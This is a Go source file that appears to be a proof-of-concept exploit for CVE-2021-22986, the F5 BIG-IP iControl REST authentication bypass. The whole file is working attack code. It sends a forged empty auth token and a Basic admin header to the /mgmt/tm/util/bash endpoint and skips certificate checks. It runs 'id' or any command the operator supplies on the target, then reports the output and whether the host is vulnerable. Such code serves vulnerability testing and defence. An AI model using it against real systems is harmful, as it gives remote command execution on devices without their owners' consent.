package cve_2021_22986

import (
	"fmt"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"os"
	"strings"
)

type result struct {
	Kind          string `json:"kind"`
	Command       string `json:"command"`
	UtilCmdArgs   string `json:"utilCmdArgs"`
	CommandResult string `json:"commandResult"`
}

var (
	urlBase string
)

func Poc(urlInput, command, vul string) {
	if strings.HasSuffix(urlInput, `/`) {
		urlInput = strings.TrimRight(urlInput, `/`)
	}
	urlBase = urlInput
	if command == "" {
		color.Green("[+] Start test vul: %s on target: %s; ", vul, urlBase)
	} else {
		color.Green("[+] Start test vul: %s on target: %s; command: %s", vul, urlBase, command)
	}
	urlIndex := urlBase + "/mgmt/tm/util/bash"
	client := req.C()
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()
	customHeader := map[string]string{
		"X-F5-Auth-Token": "",
		"Authorization":   "Basic YWRtaW46",
		"Content-Type":    "application/json",
	}
	payload := map[string]string{
		"command":     "run",
		"utilCmdArgs": "-c id",
	}
	if command != "" {
		payload["utilCmdArgs"] = fmt.Sprintf("-c %s", command)
	}
	var respResults result
	resp, err := client.R().SetHeaders(customHeader).SetBodyJsonMarshal(payload).SetResult(&respResults).Post(urlIndex)
	if err != nil {
		color.Red("[-] Error: %s", err.Error())
		color.Red("[-] Check %s Error", vul)
		os.Exit(0)
	}

	if resp.IsSuccess() && strings.Contains(resp.String(), `commandResult`) {
		if command != "" {
			color.Green("[+] Command result: %s", strings.TrimRight(respResults.CommandResult, "\n"))
		}
		color.Green("[+] Vul %s check result: %s is vulnerable", vul, urlBase)
	} else {
		color.Red("[-] Vul %s check result: %s is not vulnerable", vul, urlBase)
	}
}
